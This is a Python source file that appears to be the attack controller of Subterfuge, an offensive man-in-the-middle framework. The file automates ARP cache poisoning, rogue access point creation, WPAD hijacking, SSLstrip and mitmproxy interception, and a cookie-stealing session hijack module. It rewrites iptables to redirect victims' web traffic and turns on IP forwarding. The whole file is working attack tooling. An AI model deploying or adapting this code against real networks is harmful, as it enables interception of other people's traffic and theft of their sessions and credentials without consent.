#September 16 update fixes issues #2 and #4 due to Django Upgrade issues. CAO Django version 1.7.7

import os
import re
import sys
sys.path.append('/usr/share/subterfuge')
sys.path.append('/usr/share')
import time
  #Ignore Deprication Warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

import django
django.setup()
    
'''
from django.conf import settings
settings.configure(
DATABASES = {
    'default' : {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': "/usr/share/subterfuge/db",
        'USER': '',
        'PASSWORD': '',
        'HOST': '',
    }
}
)
'''


from django.db import models
from subterfuge.main.models import *
from subterfuge.modules.models import *

#Subterfuge Imports
sys.path.append('/usr/share/subterfuge/utilities')
from errorhandler import notification_attackctrl


def attack(method):
    notification_attackctrl("init")
    print "Starting Pwn Ops..."
    
        #Determine Active Vectors
    acp, apgenatk, wpad = getvectors()
    target = ""
    
        #Launch Attacks
        #ARP Cache Poison
    if acp == "yes":
            #Auto Pwn Method
        if (method == "auto"):
            print "Running AutoPwn Method..."
                #AutoConfig
            autoconfig()
            interface, gateway, attackerip, routermac, smartarp, proxymode = getinfo()
            
                #Begin Attack Setup
            print "Automatically Configuring Subterfuge..."
            iptablesconfig(proxymode)
            print "Initiating ARP Poison With ARPMITM..."
            
               #Get Poison Options
            for info in arppoison.objects.all():
               target     = info.target
               method     = info.method
               
                #Check for poison single/all
            if (method == "single"):
               try:
                  print "Poisoning: " + target
                  command = 'python ' + os.path.dirname(os.path.abspath(__file__)) + '/utilities/arpmitm.py -s ' + target + " " + gateway + ' &'
               except:
                  notification_attackctrl("no-single-target")
                  print "Could not poison single target: no target found!"
            else:
               print "Poisoning: Network"
               command = 'python ' + os.path.dirname(os.path.abspath(__file__)) + '/utilities/arpmitm.py ' + gateway + ' &'
               
                #ARP Cache Poison through Subterfuge:
            os.system(command)
            if proxymode == "sslstrip":
               print "Starting up SSLstrip..."
               sslstrip()
            elif proxymode == "mitmproxy":
               print "Starting up the MITM Attack Proxy..."
               mitmproxy()
            sessionhijack()

                #Get & Log Router Mac
            if (os.path.exists(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")):
                f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
                mac = f.readline()
                macaddr = mac.rstrip("\n")
                setup.objects.update(routermac = macaddr)

            #os.system("python " + str(os.path.dirname(__file__)) + "/mitm.py -a &")
                
                 #Check for ARPWatch
            if (smartarp == "yes"):
               try:
                  os.system("python " + str(os.path.dirname(__file__)) + "/utilities/arpwatch.py " + gateway + " " + routermac + " " + attackerip + " &")
                
               except:
                   notification_attackctrl("arpwatch-no-rmac")
                   print "Encountered an error configuring arpwatch: Router MAC Address Unknown."
            
            #Standard Attack Method
        else:
            interface, gateway, attackerip, routermac, smartarp, proxymode = getinfo()
            
                #Begin Attack Setup
            print "Automatically Configuring Subterfuge..."
            iptablesconfig(proxymode)
            print "Initiating ARP Poison With ARPMITM..."
            
               #Get Poison Options
            for info in arppoison.objects.all():
               target     = info.target
               
                #Check for poison single/all
            if (method == "single"):
               command = 'python ' + os.path.dirname(os.path.abspath(__file__)) + '/utilities/arpmitm.py -s ' + target + " " + gateway + ' &'
            else:
               command = 'python ' + os.path.dirname(os.path.abspath(__file__)) + '/utilities/arpmitm.py ' + gateway + ' &'
               
                #ARP Cache Poison through Subterfuge:
            os.system(command)
            iptablesconfig(proxymode)
            if proxymode == "sslstrip":
               print "Starting up SSLstrip..."
               sslstrip()
            elif proxymode == "mitmproxy":
               print "Starting up the MITM Attack Proxy..."
               mitmproxy()
            sessionhijack()
    
                #Get & Log Router Mac
            if (os.path.exists(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")):
                f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
                mac = f.readline()
                macaddr = mac.rstrip("\n")
                setup.objects.update(routermac = macaddr)
                
                #Check for ARPWatch
            if (smartarp == "yes"):
                os.system("python " + str(os.path.dirname(__file__)) + "/utilities/arpwatch.py " + gateway + " " + routermac + " " + attackerip + " &")
                
            else:
                print "Dynamic ARP Retention is disabled."
                
        #Wireless AP Generator
    if apgenatk == "yes":
            #Get Attack Info
        for info in apgen.objects.all():
            essid     = info.essid
            channel   = info.channel
            atknic    = info.atknic
            netnic    = info.netnic
        
        print "Launching Access Point Generation Attack..."
        cmd = "xterm -e sh -c 'python " + str(os.path.dirname(__file__)) + "/utilities/apgen.py " + essid + " " + atknic + " " + netnic + "' &"
        print cmd
        os.system(cmd)
        
            #Begin MITM Attack Setup
        print "Automatically Configuring Subterfuge..."
        iptablesconfig(proxymode)
        print "Starting up SSLstrip..."
        if proxymode == "sslstrip":
           sslstrip()
        elif proxymode == "mitmproxy":
           print "Starting up the MITM Attack Proxy..."
           mitmproxy()

        sessionhijack()
        
        #WPAD Hijacking
    if wpad == "yes":
        #Auto Pwn Method
        print "Running AutoPwn Method..."
            #AutoConfig
        autoconfig()
        interface, gateway, attackerip, routermac, smartarp, proxymode = getinfo()
        
            #Begin MITM Attack Setup
            #Begin Attack Setup
            #No IPTables SSLStrip Configuration necessary for WPAD Hijacking
        #print "Automatically Configuring Subterfuge..."
        #iptablesconfig(proxymode)
            #Flush IPTables
        print "Flushing IPTables for WPAD Hijacking"
        os.system("iptables -t nat -F")
        print "Starting up SSLstrip..."
        sslstrip()
        sessionhijack()
            #Execute WPAD Hijacking
        os.system("python " + str(os.path.dirname(__file__)) + "/utilities/wpadhijack.py " + gateway + " " + routermac + " " + attackerip + " &")
        
        #Start Up Modules
    modules()
        

def getvectors():
        #Get Attack Vectors
    active = []
    for vector in vectors.objects.all():
        active.append(vector.active)
    
        #Return Active/Inactive
    return active[0], active[1], active[2]

def modules():
        #Check Active
    active = []
    for module in installed.objects.all():
        active.append(module.active)    
            #Deploy Active Vectors
        if module.active == "yes" or module.active == "true":
            os.system("python " + str(os.path.dirname(__file__)) + "/modules/" + module.name + "/" + module.name + ".py &")
    


def getinfo():
        #Get Globals from Database
    for settings in setup.objects.all():
        interface     = settings.iface
        gateway       = settings.gateway
        attackerip    = settings.ip
        routermac     = settings.routermac
        smartarp      = settings.smartarp
        proxymode     = settings.proxymode
    
    return interface, gateway, attackerip, routermac, smartarp, proxymode


    #SSLStrip tooled through Subterfuge:
def sslstrip():
    #run sslstrip
    os.system('python ' + os.path.dirname(__file__) + '/sslstrip.py -w ' + os.path.dirname(__file__) + '/sslstrip.log -l 10000 -f &')
    #-a includes all traffic not just https post requests

    #Subterfuge Interception Proxy
def mitmproxy():
    #run proxy
    os.system('mitmdump --cert=/usr/share/subterfuge/cert.pem -w /usr/share/subterfuge/mitmproxy.log -p 10001 & 1> /dev/null 2>/dev/null')

    
def sessionhijack():
    #run cookiestealer
    os.system('python /usr/share/subterfuge/modules/sessionhijacking/cookiestealer.py &')
    

    #Set system configuration to perform MITM Attacks
def iptablesconfig(proxymode):
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('iptables -t mangle -F')
    os.system('iptables -t mangle -X')
    os.system('iptables -P INPUT ACCEPT')
    os.system('iptables -P FORWARD ACCEPT')
    os.system('iptables -P OUTPUT ACCEPT')
    time.sleep(1)
    #10000 = SSLStrip & 10001 = MITMPROXY
    if proxymode == "sslstrip":
       os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
    elif proxymode == "mitmproxy":
       os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10001')
       os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10001')

    time.sleep(1)
    print "Iptables Prerouting Configured\n"
    
    print 'Configuring System...'
    os.system('sysctl -w net.ipv4.ip_forward=1')
    print "IP Forwarding Enabled."

def autoconfig():
          # Read in subterfuge.conf Deprecate for Version 5.0
    with open(str(os.path.dirname(__file__)) + '/subterfuge.conf', 'r') as file:
        conf = file.readlines()
    
        # Get AutoConfiguration Information
        # Get Interfaces
    f = os.popen("ls /sys/class/net/")
    temp = ''
    temp = f.readline().rstrip('\n')
    result = []
    result.append(temp)
    while (temp != ''):
       temp = f.readline().rstrip('\n')
       if (temp != 'lo'):
                result.append(temp)
    result.remove('')
    
        # Get Gateway
    gw = []
    e = os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'")
    ttemp = ''
    ttemp = e.readline().rstrip('\n')
    if not ttemp:
       print 'No default gateway present'
    else:
       gw.append(ttemp)
    temp = ''
    gw.append(temp)
    for interface in result:
       f = os.popen("ifconfig " + interface + " | awk '/inet /{print substr($2,0)}'")
       temp2 = ''
       temp3 = ''
       temp = f.readline().rstrip('\n')
       temp2 = re.findall(r'\d*.\d*.\d*.', temp)
       if not temp2:
          print "No default gw on " + interface
       else:
          gate = temp2[0] + '1'
          gw.append(gate)
          result[0] = interface
          autogate = gw[0]
    gw.remove('')
    gw.reverse()
    
        #Read in Config File Deprecate for Version 5.0
    f = open(str(os.path.dirname(__file__)) + '/subterfuge.conf', 'r')
    conf = f.readlines()
         
        #Get the Local IP Address
    #f = os.popen("ifconfig " + result[0] + " | grep 'inet\ ' | sed -e \'s/.*inet//;s/ .*//\'")
    #f = os.popen('ifconfig eth0 | grep "inet\ "')
    f = os.popen("ifconfig " + result[0] + " | awk '/inet /{print substr($2,0)}'")
    temp2 = ''
    temp3 = ''
    temp = f.readline().rstrip('\n')

    ipaddress = re.findall(r'\d*.\d*.\d*.\d*', temp)[0]
    
        # Edit subterfuge.conf Deprecate for Version 5.0
    print "Using: ", result[0]
    print "Setting gateway as: ", autogate
    conf[17] = autogate + "\n"
    conf[15] = result[0] + "\n"
    conf[26] = ipaddress + "\n"
    
        #Set Database
    setup.objects.update(gateway = autogate)
    setup.objects.update(iface = result[0])
    setup.objects.update(ip = ipaddress) 
    
        # Write to subterfuge.conf Deprecate for Version 5.0
    with open(str(os.path.dirname(__file__)) + '/subterfuge.conf', 'w') as file:
        file.writelines(conf)
        
    #Check Arguments
if len(sys.argv) < 1:
    notification_attackctrl("autoconfig-error")
    print "Encountered an error configuring attack: Invalid Arguments. Terminating..."
    exit()
else:
    attack(sys.argv[1])
